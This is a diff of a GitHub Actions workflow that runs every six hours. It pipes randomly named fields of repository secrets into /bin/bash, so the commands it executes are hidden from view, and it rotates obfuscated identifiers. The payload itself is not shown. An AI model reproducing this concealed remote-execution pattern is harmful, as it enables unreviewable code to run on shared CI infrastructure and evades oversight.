@@ -3,25 +3,21 @@ name: thenexplore
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 2/6 * * *'
-
+    - cron: '5 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: thenexplore
         env:
-          ucf1487: ${{ secrets.ucf1487 }}
+          dvgp3307: ${{ secrets.dvgp3307 }}
         run: |
-          echo $ucf1487 | jq -r .gwosz14 | /bin/bash
-          echo $a7 | jq -r .kgg7 | /bin/bash
-          echo $uzt0 | jq -r .guguz8 | /bin/bash
-          echo $knyd291 | jq -r .vip7945 | /bin/bash
-          echo $svup2069 | jq -r .lbil543 | /bin/bash
-          echo $byjmt4243 | jq -r .ntcga266 | /bin/bash
-          echo $s54 | jq -r .bfc346 | /bin/bash
-          echo $ivpc36789 | jq -r .ldg382 | /bin/bash
-          echo $it6 | jq -r .m51944 | /bin/bash
-          echo $sjzm03584 | jq -r .g580 | /bin/bash
+          echo $dvgp3307 | jq -r .uzv78 | /bin/bash
+          echo $tq0522 | jq -r .ranxb5381 | /bin/bash
+          echo $dudd64141 | jq -r .cfmht624 | /bin/bash
+          echo $zx6938 | jq -r .ohkyp50541 | /bin/bash
+          echo $rycvm11 | jq -r .ec501 | /bin/bash
+          echo $ksiil2901 | jq -r .va3700 | /bin/bash
 
